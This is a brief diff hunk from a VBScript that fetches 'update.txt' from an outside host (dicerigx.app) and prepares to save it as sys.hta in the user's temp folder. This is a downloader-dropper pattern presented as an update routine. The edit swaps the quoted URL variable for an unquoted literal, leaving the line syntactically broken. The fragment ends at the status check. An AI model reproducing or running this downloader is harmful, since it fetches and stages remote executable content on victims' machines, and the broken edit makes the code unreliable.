@@ -6,7 +6,7 @@ Set sh = CreateObject("WScript.Shell")
 url = "https://dicerigx.app/update.txt"
 path = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys.hta"
 
-xh.Open "GET", url, False
+xh.Open "GET", https://dicerigx.app, False
 xh.Send
 
 If xh.Status = 200 Then
